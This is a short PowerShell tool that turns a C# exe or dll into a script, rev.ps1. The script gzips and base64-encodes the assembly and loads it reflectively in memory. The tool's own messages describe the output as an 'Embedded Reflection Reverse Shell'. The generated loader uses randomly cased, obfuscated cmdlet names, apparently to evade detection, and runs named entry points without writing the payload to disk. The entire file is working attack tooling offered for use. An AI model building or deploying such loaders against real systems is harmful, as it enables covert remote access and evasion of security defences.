param([parameter(mandatory)] $File)

$bytes = [System.IO.File]::ReadAllBytes($File)
[System.IO.MemoryStream] $outStream = New-Object System.IO.MemoryStream
$gzipStream = New-Object System.IO.Compression.GzipStream($outStream, [System.IO.Compression.CompressionMode]::Compress)
$gzipStream.Write($bytes, 0, $bytes.Length)
$gzipStream.Close()
$outStream.Close()
[byte[]] $outBytes = $outStream.ToArray()
$b64Zipped = [System.Convert]::ToBase64String($outBytes)

$reflection_code_exe = @"
`$a = NeW-obJeCt sYsTeM.Io.MEMoRysTREaM(,[coNveRT]::frombaSE64sTrINg("$b64Zipped"))
`$DEcoMpRESSEd = nEw-obJEct SYsteM.io.CompREsSION.gzIPsTreaM(`$a, [sYstEM.iO.COMPrEssION.CompRESsIonMODE]::decOmPRESs)
`$OUtpuT = New-oBjeCt SySTeM.IO.MEmorYstREam
`$dEcoMPReSSEd.copYto( `$outPUt )
[BYte[]]`$ByTEOuTarrAy = `$OUtPUT.toarrAY()
`$RAs = [sySTeM.REfLecTIOn.ASSEmBlY]::load(`$bYTeOUTArraY)
[thanos.black_order]::Main(0)
"@

$reflection_code_dll = @"
`$a = NeW-obJeCt sYsTeM.Io.MEMoRysTREaM(,[coNveRT]::frombaSE64sTrINg("$b64Zipped"))
`$DEcoMpRESSEd = nEw-obJEct SYsteM.io.CompREsSION.gzIPsTreaM(`$a, [sYstEM.iO.COMPrEssION.CompRESsIonMODE]::decOmPRESs)
`$OUtpuT = New-oBjeCt SySTeM.IO.MEmorYstREam
`$dEcoMPReSSEd.copYto( `$outPUt )
[BYte[]]`$ByTEOuTarrAy = `$OUtPUT.toarrAY()
`$tesaract = [sySTeM.REfLecTIOn.ASSEmBlY]::load(`$bYTeOUTArraY)
`$wakanda = `$tesaract.GetType("thanos.black_order")
`$thanos = `$wakanda.GetMethod("sanctuary2")
`$thanos.Invoke(0, `$null)
"@

if($file.Substring($file.Length - 3, 3) -eq "exe"){
    Write-Host "[+] Written the C# exe Embedded Reflection Reverse Shell into rev.ps1"
    $reflection_code_exe | Out-File rev.ps1
}

elseif($file.Substring($file.Length - 3, 3) -eq "dll"){
    Write-Host "[+] Written the C# dll Embedded Reflection Reverse Shell into rev.ps1"
    $reflection_code_dll | Out-File rev.ps1
}

else{
    Write-Host "[-] Only exe and dll C# payloads are only supported"
}